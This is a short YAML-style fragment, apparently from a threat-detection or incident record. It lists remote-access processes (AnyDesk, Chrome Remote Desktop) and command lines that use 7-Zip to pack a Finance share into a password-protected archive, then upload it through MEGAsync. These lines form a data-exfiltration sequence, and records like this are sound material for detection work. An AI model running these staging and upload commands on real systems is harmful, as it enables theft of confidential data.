  - remoting_host.exe
  - AnyDesk.exe
  - conhost.exe
  - Everything.exe
  - 7z.exe
  - MEGAsync.exe
  command_lines:
  - '"C:\Program Files (x86)\Google\Chrome Remote Desktop\147.0.7727.3\remoting_host.exe"
    --type=daemon --host-config="C:\ProgramData\Google\Chrome Remo..."'
  - '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service'
  - '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --control'
  - '"C:\Program Files\Everything\Everything.exe"'
  - '"C:\Program Files\7-Zip\7z.exe" a -tzip -p<PASSWORD> -mx5 C:\Users\<USER>\Downloads\data.zip
    "C:\Shares\Finance\*"'
  - '"C:\Users\<USER>\AppData\Local\MEGAsync\MEGAsync.exe" /upload "C:\Users\<USER>\Downloads\data.zip"'
  powershell: []
